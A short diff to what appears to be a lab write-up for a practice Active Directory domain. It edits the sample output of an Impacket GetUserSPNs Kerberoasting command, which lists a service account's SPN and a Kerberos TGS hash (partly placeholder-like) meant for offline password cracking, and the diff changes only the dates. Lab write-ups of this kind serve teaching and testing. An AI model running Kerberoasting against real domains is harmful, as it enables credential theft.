@@ -31,7 +31,7 @@ python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py essos.local/daen
 ```
 ServicePrincipalName         Name        MemberOf  PasswordLastSet             LastLogon                   Delegation  PwdNeverExpires  UAC      
 ---------------------------- ----------  --------  --------------------------  --------------------------  ----------  ---------------  --------
-MSSQLSvc/meereen.essos.local:1433 sql_svc            2025-02-26 09:30:35.437503  2025-05-23 07:05:19.141162            False             0x410200 
+MSSQLSvc/meereen.essos.local:1433 sql_svc            2024-02-26 09:30:35.437503  2024-05-23 07:05:19.141162            False             0x410200 
 
 $krb5tgs$23$*sql_svc$MSSQLSvc/meereen.essos.local*essos.local*$d21c1eebd2bfa64bd4f5f3a7c67cf885$aa3b1c1b1f2c3a2a0b7a5d0f0e0b6e5e6e4c3d2e1b0a0a0b0d0e0f0a0b0a0b0a0b0a0b0a0b0a0b0a0b0a0b0a0b0a0b0a0b0a0b
 ```
